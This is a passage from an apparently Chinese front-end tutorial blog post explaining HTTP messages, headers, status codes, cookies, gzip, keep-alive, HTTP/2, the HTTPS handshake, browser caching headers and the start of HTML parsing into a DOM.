程序）</li><li>然后就是后台会有自己的统一处理，处理完后响应响应结果</li></ul><p>概括下：</p><ul><li>一般有的后端是有统一的验证的，如安全拦截，跨域验证</li><li>如果这一步不符合规则，就直接返回了相应的 http 报文（如拒绝请求等）</li><li>然后当验证通过后，才会进入实际的后台代码，此时是程序接收到请求，然后执行（譬如查询数据库，大量计算等等）</li><li>等程序执行完毕后，就会返回一个 http 响应包（一般这一步也会经过多层封装）</li><li>然后就是将这个包从后端发送到前端，完成交互<br><a name="section-11"></a></li></ul><h2 id="后台和前台的-http-交互"><a href="#后台和前台的-http-交互" class="headerlink" title="后台和前台的 http 交互"></a>后台和前台的 http 交互</h2><p>前后端交互时，http 报文作为信息的载体<br />所以 http 是一块很重要的内容，这一部分重点介绍它<br><a name="section-11-1"></a></p><h3 id="http-报文结构"><a href="#http-报文结构" class="headerlink" title="http 报文结构"></a>http 报文结构</h3><p>报文一般包括了：<code>通用头部</code>，<code>请求/响应头部</code>，<code>请求/响应体</code><br /><strong>通用头部</strong><br />这也是开发人员见过的最多的信息，包括如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request Url: 请求的web服务器地址</span><br><span class="line">Request Method: 请求方式</span><br><span class="line">（Get、POST、OPTIONS、PUT、HEAD、DELETE、CONNECT、TRACE）</span><br><span class="line">Status Code: 请求的返回状态码，如200代表成功</span><br><span class="line">Remote Address: 请求的远程服务器地址（会转为IP）</span><br></pre></td></tr></table></figure><p>譬如，在跨域拒绝时，可能是 method 为<code>options</code>，状态码为<code>404/405</code>等（当然，实际上可能的组合有很多）<br />其中，Method 的话一般分为两批次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</span><br><span class="line">以及几种Additional Request Methods：PUT、DELETE、LINK、UNLINK</span><br><span class="line">HTTP1.1定义了八种请求方法：GET、POST、HEAD、OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</span><br></pre></td></tr></table></figure><p><code>HTTP 1.0</code>定义参考：<a href="https://tools.ietf.org/html/rfc1945">https://tools.ietf.org/html/rfc1945</a><br /><code>HTTP 1.1</code>定义参考：<a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a><br />这里面最常用到的就是状态码，很多时候都是通过状态码来判断，如（列举几个最常见的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">200——表明该请求被成功地完成，所请求的资源发送回客户端</span><br><span class="line">304——自从上次请求后，请求的网页未修改过，请客户端使用本地缓存</span><br><span class="line">400——客户端请求有错（譬如可以是安全模块拦截）</span><br><span class="line">401——请求未经授权</span><br><span class="line">403——禁止访问（譬如可以是未登录时禁止）</span><br><span class="line">404——资源未找到</span><br><span class="line">500——服务器内部错误</span><br><span class="line">503——服务不可用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>再列举下大致不同范围状态的意义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xx——指示信息，表示请求已接收，继续处理</span><br><span class="line">2xx——成功，表示请求已被成功接收、理解、接受</span><br><span class="line">3xx——重定向，要完成请求必须进行更进一步的操作</span><br><span class="line">4xx——客户端错误，请求有语法错误或请求无法实现</span><br><span class="line">5xx——服务器端错误，服务器未能实现合法的请求</span><br></pre></td></tr></table></figure><p>总之，当请求出错时，状态码能帮助快速定位问题，完整版本的状态可以自行去互联网搜索<br /><strong>请求&#x2F;响应头部</strong><br />请求和响应头部也是分析时常用到的<br />常用的请求头部（部分）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Accept: 接收类型，表示浏览器支持的MIME类型</span><br><span class="line">（对标服务端返回的Content-Type）</span><br><span class="line">Accept-Encoding：浏览器支持的压缩类型,如gzip等,超出类型不能接收</span><br><span class="line">Content-Type：客户端发送出去实体内容的类型</span><br><span class="line">Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache</span><br><span class="line">If-Modified-Since：对应服务端的Last-Modified，用来匹配看文件是否变动，只能精确到1s之内，http1.0中</span><br><span class="line">Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间</span><br><span class="line">Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中</span><br><span class="line">If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中</span><br><span class="line">Cookie: 有cookie并且同域访问时会自动带上</span><br><span class="line">Connection: 当浏览器与服务器通信时对于长连接如何进行处理,如keep-alive</span><br><span class="line">Host：请求的服务器URL</span><br><span class="line">Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私</span><br><span class="line">Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)</span><br><span class="line">User-Agent：用户客户端的一些必要信息，如UA头部等</span><br></pre></td></tr></table></figure><p>常用的响应头部（部分）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: 服务器端允许的请求Headers</span><br><span class="line">Access-Control-Allow-Methods: 服务器端允许的请求方法</span><br><span class="line">Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）</span><br><span class="line">Content-Type：服务端返回的实体内容的类型</span><br><span class="line">Date：数据从服务器发送的时间</span><br><span class="line">Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档</span><br><span class="line">Last-Modified：请求资源的最后修改时间</span><br><span class="line">Expires：应该在什么时候认为文档已经过期,从而不再缓存它</span><br><span class="line">Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效</span><br><span class="line">ETag：请求变量的实体标签的当前值</span><br><span class="line">Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端</span><br><span class="line">Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）</span><br><span class="line">Server：服务器的一些相关信息</span><br></pre></td></tr></table></figure><p>一般来说，请求头部和响应头部是匹配分析的。<br />譬如，请求头部的<code>Accept</code>要和响应头部的<code>Content-Type</code>匹配，否则会报错<br />譬如，跨域请求时，请求头部的<code>Origin</code>要匹配响应头部的<code>Access-Control-Allow-Origin</code>，否则会报跨域错误<br />譬如，在使用缓存时，请求头部的<code>If-Modified-Since</code>、<code>If-None-Match</code>分别和响应头部的<code>Last-Modified</code>、<code>ETag</code>对应<br />还有很多的分析方法，这里不一一赘述<br /><strong>请求&#x2F;响应实体</strong><br />http 请求时，除了头部，还有消息实体，一般来说<br />请求实体中会将一些需要的参数都放入进入（用于 post 请求）。<br />譬如实体中可以放参数的序列化形式（<code>a=1&amp;b=2</code>这种），或者直接放表单对象（<code>Form Data</code>对象，上传时可以夹杂参数以及文件），等等<br />而一般响应实体中，就是放服务端需要传给客户端的内容<br />一般现在的接口请求时，实体中就是对于的信息的 json 格式，而像页面请求这种，里面就是直接放了一个 html 字符串，然后浏览器自己解析并渲染。<br /><strong>CRLF</strong><br />CRLF（Carriage-Return Line-Feed），意思是回车换行，一般作为分隔符存在<br />请求头和实体消息之间有一个 CRLF 分隔，响应头部和响应实体之间用一个 CRLF 分隔<br />一般来说（分隔符类别）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CRLF-&gt;Windows-style</span><br><span class="line">LF-&gt;Unix Style</span><br><span class="line">CR-&gt;Mac Style</span><br></pre></td></tr></table></figure><p>如下图是对某请求的 http 报文结构的简要分析<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826323-37c57fdf-d8fb-4c9e-9d0c-7f035baba086.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826323-37c57fdf-d8fb-4c9e-9d0c-7f035baba086.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-11-2"></a></p><h3 id="cookie-以及优化"><a href="#cookie-以及优化" class="headerlink" title="cookie 以及优化"></a>cookie 以及优化</h3><p>cookie 是浏览器的一种本地存储方式，一般用来帮助客户端和服务端通信的，常用来进行身份校验，结合服务端的 session 使用。<br />场景如下（简述）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在登陆页面，用户登陆了</span><br><span class="line">此时，服务端会生成一个session，session中有对于用户的信息（如用户名、密码等）</span><br><span class="line">然后会有一个sessionid（相当于是服务端的这个session对应的key）</span><br><span class="line">然后服务端在登录页面中写入cookie，值就是:jsessionid=xxx</span><br><span class="line">然后浏览器本地就有这个cookie了，以后访问同域名下的页面时，自动带上cookie，自动检验，在有效时间内无需二次登陆。</span><br></pre></td></tr></table></figure><p>上述就是 cookie 的常用场景简述（当然了，实际情况下得考虑更多因素）<br />一般来说，cookie 是不允许存放敏感信息的（千万不要明文存储用户名、密码），因为非常不安全，如果一定要强行存储，首先，一定要在 cookie 中设置<code>httponly</code>（这样就无法通过 js 操作了），另外可以考虑 rsa 等非对称加密（因为实际上，浏览器本地也是容易被攻克的，并不安全）<br />另外，由于在同域名的资源请求时，浏览器会默认带上本地的 cookie，针对这种情况，在某些场景下是需要优化的。<br />譬如以下场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端在域名A下有cookie（这个可以是登陆时由服务端写入的）</span><br><span class="line">然后在域名A下有一个页面，页面中有很多依赖的静态资源（都是域名A的，譬如有20个静态资源）</span><br><span class="line">此时就有一个问题，页面加载，请求这些静态资源时，浏览器会默认带上cookie</span><br><span class="line">也就是说，这20个静态资源的http请求，每一个都得带上cookie，而实际上静态资源并不需要cookie验证</span><br><span class="line">此时就造成了较为严重的浪费，而且也降低了访问速度（因为内容更多了）</span><br></pre></td></tr></table></figure><p>当然了，针对这种场景，是有优化方案的（多域名拆分）。具体做法就是：</p><ul><li>将静态资源分组，分别放到不同的域名下（如<code>static.base.com</code>）</li><li>而<code>page.base.com</code>（页面所在域名）下请求时，是不会带上<code>static.base.com</code>域名的 cookie 的，所以就避免了浪费</li></ul><p>说到了多域名拆分，这里再提一个问题，那就是：</p><ul><li>在移动端，如果请求的域名数过多，会降低请求速度（因为域名整套解析流程是很耗费时间的，而且移动端一般带宽都比不上 pc）</li><li>此时就需要用到一种优化方案：<code>dns-prefetch</code>（让浏览器空闲时提前解析 dns 域名，不过也请合理使用，勿滥用）</li></ul><p>关于 cookie 的交互，可以看下图总结<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596827095-d66490b9-d964-48db-8891-a9a125d6d811.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596827095-d66490b9-d964-48db-8891-a9a125d6d811.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-11-3"></a></p><h3 id="gzip-压缩"><a href="#gzip-压缩" class="headerlink" title="gzip 压缩"></a>gzip 压缩</h3><p>首先，明确<code>gzip</code>是一种压缩格式，需要浏览器支持才有效（不过一般现在浏览器都支持）， 而且 gzip 压缩效率很好（高达 70%左右）<br />然后 gzip 一般是由<code>apache</code>、<code>tomcat</code>等 web 服务器开启<br />当然服务器除了 gzip 外，也还会有其它压缩格式（如 deflate，没有 gzip 高效，且不流行）<br />所以一般只需要在服务器上开启了 gzip 压缩，然后之后的请求就都是基于 gzip 压缩格式的， 非常方便。<br><a name="section-11-4"></a></p><h3 id="长连接与短连接"><a href="#长连接与短连接" class="headerlink" title="长连接与短连接"></a>长连接与短连接</h3><p>首先看<code>tcp/ip</code>层面的定义：</p><ul><li>长连接：一个 tcp&#x2F;ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包）</li><li>短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接</li></ul><p>然后在 http 层面：</p><ul><li><code>http1.0</code>中，默认使用的是短连接，也就是说，浏览器没进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接</li><li>http1.1 起，默认使用长连接，使用长连接会有这一行<code>Connection: keep-alive</code>，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接</li></ul><p>注意： <strong>keep-alive 不会永远保持，它有一个持续时间，一般在服务器中配置（如 apache），另外长连接需要客户端和服务器都支持时才有效</strong><br><a name="section-11-5"></a></p><h3 id="http-2-0"><a href="#http-2-0" class="headerlink" title="http 2.0"></a>http 2.0</h3><p>http2.0 不是 https，它相当于是 http 的下一代规范（譬如 https 的请求可以是 http2.0 规范的）<br />然后简述下 http2.0 与 http1.1 的显著不同点：</p><ul><li>http1.1 中，每请求一个资源，都是需要开启一个 tcp&#x2F;ip 连接的，所以对应的结果是，每一个资源对应一个 tcp&#x2F;ip 请求，由于 tcp&#x2F;ip 本身有并发数限制，所以当资源一多，速度就显著慢下来</li><li>http2.0 中，一个 tcp&#x2F;ip 请求可以请求多个资源，也就是说，只要一次 tcp&#x2F;ip 请求，就可以请求若干个资源，分割成更小的帧请求，速度明显提升。</li></ul><p>所以，如果 http2.0 全面应用，很多 http1.1 中的优化方案就无需用到了（譬如打包成精灵图，静态资源多域名拆分等）<br />然后简述下 http2.0 的一些特性：</p><ul><li>多路复用（即一个 tcp&#x2F;ip 连接可以请求多个资源）</li><li>首部压缩（http 头部压缩，减少体积）</li><li>二进制分帧（在应用层跟传送层之间增加了一个二进制分帧层，改进传输性能，实现低延迟和高吞吐量）</li><li>服务器端推送（服务端可以对客户端的一个请求发出多个响应，可以主动通知客户端）</li><li>请求优先级（如果流被赋予了优先级，它就会基于这个优先级来处理，由服务器决定需要多少资源来处理该请求。）<br><a name="section-11-6"></a></li></ul><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>https 就是安全版本的 http，譬如一些支付等操作基本都是基于 https 的，因为 http 请求的安全系数太低了。<br />简单来看，https 与 http 的区别就是： <strong>在请求前，会建立 ssl 链接，确保接下来的通信都是加密的，无法被轻易截取分析</strong><br />一般来说，如果要将网站升级成 https，需要后端支持（后端需要申请证书等），然后 https 的开销也比 http 要大（因为需要额外建立安全链接以及加密等），所以一般来说 http2.0 配合 https 的体验更佳（因为 http2.0 更快了）<br />一般来说，主要关注的就是 SSL&#x2F;TLS 的握手流程，如下（简述）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 浏览器请求建立SSL链接，并向服务端发送一个随机数–Client random和客户端支持的加密方法，比如RSA加密，此时是明文传输。</span><br><span class="line">2. 服务端从中选出一组加密算法与Hash算法，回复一个随机数–Server random，并将自己的身份信息以证书的形式发回给浏览器</span><br><span class="line">（证书里包含了网站地址，非对称加密的公钥，以及证书颁发机构等信息）</span><br><span class="line">3. 浏览器收到服务端的证书后</span><br><span class="line"></span><br><span class="line">    - 验证证书的合法性（颁发机构是否合法，证书中包含的网址是否和正在访问的一样），如果证书信任，则浏览器会显示一个小锁头，否则会有提示</span><br><span class="line"></span><br><span class="line">    - 用户接收证书后（不管信不信任），浏览会生产新的随机数–Premaster secret，然后证书中的公钥以及指定的加密方法加密`Premaster secret`，发送给服务器。</span><br><span class="line"></span><br><span class="line">    - 利用Client random、Server random和Premaster secret通过一定的算法生成HTTP链接数据传输的对称加密key-`session key`</span><br><span class="line"></span><br><span class="line">    - 使用约定好的HASH算法计算握手消息，并使用生成的`session key`对消息进行加密，最后将之前生成的所有信息发送给服务端。</span><br><span class="line"></span><br><span class="line">4. 服务端收到浏览器的回复</span><br><span class="line">    - 利用已知的加解密方式与自己的私钥进行解密，获取`Premaster secret`</span><br><span class="line"></span><br><span class="line">    - 和浏览器相同规则生成`session key`</span><br><span class="line"></span><br><span class="line">    - 使用`session key`解密浏览器发来的握手消息，并验证Hash是否与浏览器发来的一致</span><br><span class="line"></span><br><span class="line">    - 使用`session key`加密一段握手消息，发送给浏览器</span><br><span class="line"></span><br><span class="line">5. 浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，</span><br></pre></td></tr></table></figure><p><strong>之后所有的 https 通信数据将由之前浏览器生成的</strong><code>**session key**</code><strong>并利用对称加密算法进行加密</strong><br />这里放一张图（来源：<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">阮一峰-图解 SSL&#x2F;TLS 协议</a>）<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826666-f955799e-75b6-4359-abf9-1fe56f15e6e8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826666-f955799e-75b6-4359-abf9-1fe56f15e6e8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-12"></a></p><h2 id="单独拎出来的缓存问题，http-的缓存"><a href="#单独拎出来的缓存问题，http-的缓存" class="headerlink" title="单独拎出来的缓存问题，http 的缓存"></a>单独拎出来的缓存问题，http 的缓存</h2><p>前后端的 http 交互中，使用缓存能很大程度上的提升效率，而且基本上对性能有要求的前端项目都是必用缓存的<br><a name="section-12-1"></a></p><h3 id="强缓存与弱缓存"><a href="#强缓存与弱缓存" class="headerlink" title="强缓存与弱缓存"></a>强缓存与弱缓存</h3><p>缓存可以简单的划分成两种类型：<code>强缓存</code>（<code>200 from cache</code>）与<code>协商缓存</code>（<code>304</code>）<br />区别简述如下：</p><ul><li>强缓存（<code>200 from cache</code>）时，浏览器如果判断本地缓存未过期，就直接使用，无需发起 http 请求</li><li>协商缓存（<code>304</code>）时，浏览器会向服务端发起 http 请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存</li></ul><p>对于协商缓存，使用<code>Ctrl + F5</code>强制刷新可以使得缓存无效<br />但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改了路径相当于是另一个资源了，这也是前端工程化中常用到的技巧）<br><a name="section-12-2"></a></p><h3 id="缓存头部简述"><a href="#缓存头部简述" class="headerlink" title="缓存头部简述"></a>缓存头部简述</h3><p>上述提到了强缓存和协商缓存，那它们是怎么区分的呢？<br />答案是通过不同的 http 头部控制<br />先看下这几个头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-None-Match/E-tag、If-Modified-Since/Last-Modified、Cache-Control/Max-Age、Pragma/Expires</span><br></pre></td></tr></table></figure><p>这些就是缓存中常用到的头部，这里不展开。仅列举下大致使用。<br />属于强缓存控制的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（http1.1）Cache-Control/Max-Age</span><br><span class="line">（http1.0）Pragma/Expires</span><br></pre></td></tr></table></figure><p>注意：<code>**Max-Age**</code><strong>不是一个头部，它是</strong><code>**Cache-Control**</code><strong>头部的值</strong><br />属于协商缓存控制的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（http1.1）If-None-Match/E-tag</span><br><span class="line">（http1.0）If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure><p>可以看到，上述有提到<code>http1.1</code>和<code>http1.0</code>，这些不同的头部是属于不同 http 时期的<br />再提一点，其实 HTML 页面中也有一个 meta 标签可以控制缓存方案-<code>Pragma</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span><br></pre></td></tr></table></figure><p>不过，这种方案还是比较少用到，因为支持情况不佳，譬如缓存代理服务器肯定不支持，所以不推荐<br><a name="section-12-3"></a></p><h3 id="头部的区别"><a href="#头部的区别" class="headerlink" title="头部的区别"></a>头部的区别</h3><p>首先明确，http 的发展是从 http1.0 到 http1.1<br />而在 http1.1 中，出了一些新内容，弥补了 http1.0 的不足。<br /><strong>http1.0 中的缓存控制：</strong></p><ul><li><code>Pragma</code>：严格来说，它不属于专门的缓存控制头部，但是它设置<code>no-cache</code>时可以让本地强缓存失效（属于编译控制，来实现特定的指令，主要是因为兼容 http1.0，所以以前又被大量应用）</li><li><code>Expires</code>：服务端配置的，属于强缓存，用来控制在规定的时间之前，浏览器不会发出请求，而是直接使用本地缓存，注意，Expires 一般对应服务器端时间，如<code>Expires：Fri, 30 Oct 1998 14:19:41</code></li><li><code>If-Modified-Since/Last-Modified</code>：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是<code>If-Modified-Since</code>，而服务端的是<code>Last-Modified</code>，它的作用是，在发起请求时，如果<code>If-Modified-Since</code>和<code>Last-Modified</code>匹配，那么代表服务器资源并未改变，因此服务端不会返回资源实体，而是只返回头部，通知浏览器可以使用本地缓存。<code>Last-Modified</code>，顾名思义，指的是文件最后的修改时间，而且只能精确到<code>1s</code>以内</li></ul><p><strong>http1.1 中的缓存控制：</strong></p><ul><li><code>Cache-Control</code>：缓存控制头部，有 no-cache、max-age 等多种取值</li><li><code>Max-Age</code>：服务端配置的，用来控制强缓存，在规定的时间之内，浏览器无需发出请求，直接使用本地缓存，注意，Max-Age 是 Cache-Control 头部的值，不是独立的头部，譬如<code>Cache-Control: max-age=3600</code>，而且它值得是绝对时间，由浏览器自己计算</li><li><code>If-None-Match/E-tag</code>：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是<code>If-None-Match</code>，而服务端的是<code>E-tag</code>，同样，发出请求后，如果<code>If-None-Match</code>和<code>E-tag</code>匹配，则代表内容未变，通知浏览器使用本地缓存，和 Last-Modified 不同，E-tag 更精确，它是类似于指纹一样的东西，基于<code>FileEtag INode Mtime Size</code>生成，也就是说，只要文件变，指纹就会变，而且没有 1s 精确度的限制。</li></ul><p><strong>Max-Age 相比 Expires？</strong><br /><code>Expires</code>使用的是服务器端的时间<br />但是有时候会有这样一种情况-客户端时间和服务端不同步<br />那这样，可能就会出问题了，造成了浏览器本地的缓存无用或者一直无法过期<br />所以一般 http1.1 后不推荐使用<code>Expires</code><br />而<code>Max-Age</code>使用的是客户端本地时间的计算，因此不会有这个问题<br />因此推荐使用<code>Max-Age</code>。<br />注意，如果同时启用了<code>Cache-Control</code>与<code>Expires</code>，<code>Cache-Control</code>优先级高。<br /><strong>E-tag 相比 Last-Modified？</strong><br /><code>Last-Modified</code>：</p><ul><li>表明服务端的文件最后何时改变的</li><li>它有一个缺陷就是只能精确到 1s，</li><li>然后还有一个问题就是有的服务端的文件会周期性的改变，导致缓存失效</li></ul><p>而<code>E-tag</code>：</p><ul><li>是一种指纹机制，代表文件相关指纹</li><li>只有文件变才会变，也只要文件变就会变，</li><li>也没有精确时间的限制，只要文件一遍，立马 E-tag 就不一样了</li></ul><p>如果同时带有<code>E-tag</code>和<code>Last-Modified</code>，服务端会优先检查<code>E-tag</code><br />各大缓存头部的整体关系如下图<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826929-1f0b241c-2548-4b7e-abc1-93f42eedc27a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596826929-1f0b241c-2548-4b7e-abc1-93f42eedc27a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13"></a></p><h2 id="解析页面流程"><a href="#解析页面流程" class="headerlink" title="解析页面流程"></a>解析页面流程</h2><p>前面有提到 http 交互，那么接下来就是浏览器获取到 html，然后解析，渲染<br /><strong>这部分很多都参考了网上资源，特别是图片，参考了来源中的文章</strong><br><a name="section-13-1"></a></p><h3 id="流程简述"><a href="#流程简述" class="headerlink" title="流程简述"></a>流程简述</h3><p>浏览器内核拿到内容后，渲染步骤大致可以分为以下几步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解析HTML，构建DOM树</span><br><span class="line">2. 解析CSS，生成CSS规则树</span><br><span class="line">3. 合并DOM树和CSS规则，生成render树</span><br><span class="line">4. 布局render树（Layout/reflow），负责各元素尺寸、位置的计算</span><br><span class="line">5. 绘制render树（paint），绘制页面像素信息</span><br><span class="line">6. 浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上</span><br></pre></td></tr></table></figure><p>如下图：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829677-38270453-c2a0-469f-8c29-4103c641bec2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829677-38270453-c2a0-469f-8c29-4103c641bec2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="section-13-2"></a></p><h3 id="HTML-解析，构建-DOM"><a href="#HTML-解析，构建-DOM" class="headerlink" title="HTML 解析，构建 DOM"></a>HTML 解析，构建 DOM</h3><p>整个渲染步骤中，HTML 解析是第一步。<br />简单的理解，这一步的流程是这样的：<strong>浏览器解析 HTML，构建 DOM 树。</strong><br />但实际上，在分析整体构建时，却不能一笔带过，得稍微展开。<br />解析 HTML 到构建出 DOM 当然过程可以简述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → DOM</span><br></pre></td></tr></table></figure><p>譬如假设有这样一个 HTML 页面：（以下部分的内容出自参考来源，修改了下格式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;title&gt;Critical Path&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p&gt;Hello &lt;span&gt;web performance&lt;/span&gt; students!&lt;/p&gt;</span><br><span class="line">    